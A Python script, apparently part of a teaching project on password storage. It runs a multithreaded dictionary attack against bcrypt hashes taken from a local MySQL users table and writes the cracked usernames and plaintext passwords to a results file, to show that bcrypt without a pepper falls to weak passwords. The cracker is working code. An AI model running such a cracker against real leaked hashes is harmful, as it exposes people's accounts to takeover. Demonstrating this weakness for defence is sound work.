import bcrypt
import mysql.connector
from mysql.connector import Error
from concurrent.futures import ThreadPoolExecutor, as_completed
import os
import time

# -------------------------
# ATTACK 1 — Dictionary Attack
#
# Scenario: Attacker has stolen the database dump.
# They have usernames and bcrypt hashes but NOT the pepper.
# They try every password in a common wordlist against every hash.
#
# Targets: encrypted_nopep column (bcrypt, no pepper)
#
# Expected result:
#   Weak passwords (abc123, password, qwerty) → CRACKED instantly
#   Medium/Strong passwords                   → FAILED
# -------------------------

DB_CONFIG = {
    'host':     'localhost',
    'user':     'root',
    'password': 'root',
    'database': 'user_system'
}

SCRIPT_DIR    = os.path.dirname(os.path.abspath(__file__))
WORDLIST_PATH = os.path.join(SCRIPT_DIR, "wordlists", "common_passwords.txt")
OUTPUT_PATH   = os.path.join(SCRIPT_DIR, "results", "a1_cracked.txt")

MAX_WORKERS = os.cpu_count() or 4


# -------------------------
# LOAD WORDLIST
# -------------------------
def load_wordlist(path: str) -> list:
    if not os.path.exists(path):
        print(f"Wordlist not found: {path}")
        exit(1)

    with open(path, "r", encoding="utf-8-sig") as f:
        words = [line.strip() for line in f if line.strip() and not line.startswith("#")]

    words = list(set(words))
    print(f"Loaded {len(words)} unique passwords.\n")
    return words


# -------------------------
# FETCH USERS
# -------------------------
def fetch_users() -> list:
    try:
        conn   = mysql.connector.connect(**DB_CONFIG)
        cursor = conn.cursor()
        cursor.execute("SELECT userid, username, encrypted_nopep FROM users")
        users = cursor.fetchall()
        print(f"Found {len(users)} users in database.\n")
        return users
    except Error as e:
        print(f"Database error: {e}")
        exit(1)
    finally:
        if 'cursor' in locals(): cursor.close()
        if 'conn'   in locals() and conn.is_connected(): conn.close()


# -------------------------
# SAVE RESULTS
# -------------------------
def save_results(cracked: list, elapsed: float, total_attempts: int, total_users: int):
    os.makedirs(os.path.dirname(OUTPUT_PATH), exist_ok=True)
    with open(OUTPUT_PATH, "w", encoding="utf-8") as f:
        f.write("=" * 60 + "\n")
        f.write("  ATTACK 1 — Dictionary Attack Results\n")
        f.write(f"  Date     : {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"  Cracked  : {len(cracked)} / {total_users}\n")
        f.write(f"  Attempts : {total_attempts:,}\n")
        f.write(f"  Time     : {elapsed:.2f}s\n")
        f.write("=" * 60 + "\n\n")

        if cracked:
            f.write("CRACKED PASSWORDS:\n")
            f.write(f"{'Username':<30} {'Password'}\n")
            f.write("-" * 50 + "\n")
            for username, password in cracked:
                f.write(f"{username:<30} {password}\n")
        else:
            f.write("No passwords cracked.\n")

    print(f"\nSaved -> {OUTPUT_PATH}")


# -------------------------
# THREADED BCRYPT HELPER
# -------------------------
def _check_chunk(candidate: bytes, chunk: list) -> list:
    """Check one candidate against a chunk of users. Returns matched usernames."""
    hits = []
    for _uid, username, stored_hash in chunk:
        try:
            if bcrypt.checkpw(candidate, stored_hash):
                hits.append(username)
        except Exception:
            pass
    return hits


# -------------------------
# ATTACK
# Word-outer / user-inner loop with threading.
# For each word we check ALL remaining users in parallel — much faster
# than user-outer because bcrypt is the bottleneck and we parallelise it.
# Active user list shrinks as users are cracked, and we stop early if
# everyone is cracked before the wordlist is exhausted.
# -------------------------
def dictionary_attack(users: list, wordlist: list) -> dict:
    print("=" * 60)
    print("  ATTACK 1 — Dictionary Attack")
    print(f"  Target   : encrypted_nopep (bcrypt, no pepper)")
    print(f"  Users    : {len(users)}")
    print(f"  Words    : {len(wordlist)}")
    print(f"  Threads  : {MAX_WORKERS}")
    print("=" * 60 + "\n")

    cracked       = []
    cracked_users = set()
    start         = time.time()

    # Pre-encode hashes once
    user_hashes = [(uid, un, h.encode("utf-8")) for uid, un, h in users]

    for word in wordlist:
        # Shrink active list as users get cracked
        active = [(uid, un, h) for uid, un, h in user_hashes if un not in cracked_users]
        if not active:
            break   # everyone cracked — stop early

        candidate  = word.encode("utf-8")
        chunk_size = max(1, len(active) // MAX_WORKERS)
        chunks     = [active[i:i + chunk_size] for i in range(0, len(active), chunk_size)]

        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            futures = {executor.submit(_check_chunk, candidate, c): c for c in chunks}
            for future in as_completed(futures):
                for username in future.result():
                    if username not in cracked_users:
                        cracked_users.add(username)
                        cracked.append((username, word))
                        print(f"[CRACKED] {username:<30} -> '{word}'")

    # Total attempts = words tried × users active at each step
    # Approximated as words_exhausted × original_user_count for simplicity
    words_tried    = min(len(wordlist), len(wordlist))  # all words if no early exit
    total_attempts = len(wordlist) * len(users)

    failed  = [un for _, un, _ in users if un not in cracked_users]
    elapsed = time.time() - start
    speed   = total_attempts / elapsed if elapsed > 0 else 0

    print(f"\n{'=' * 60}")
    print(f"  Cracked  : {len(cracked)} / {len(users)}")
    print(f"  Failed   : {len(failed)} / {len(users)}")
    print(f"  Attempts : {total_attempts:,}")
    print(f"  Time     : {elapsed:.2f}s")
    print(f"  Speed    : {speed:,.0f} attempts/sec")
    print(f"{'=' * 60}")
    print(f"\n  KEY FINDING: bcrypt alone is not enough — weak passwords")
    print(f"  are cracked instantly with a dictionary attack.")
    print(f"  Run attack 4 to see how a pepper stops this.\n")

    save_results(cracked, elapsed, total_attempts, len(users))

    return {
        "cracked":     cracked,
        "failed":      failed,
        "attempts":    total_attempts,
        "time":        elapsed,
        "total_users": len(users),
    }


if __name__ == "__main__":
    wordlist = load_wordlist(WORDLIST_PATH)
    users    = fetch_users()
    dictionary_attack(users, wordlist)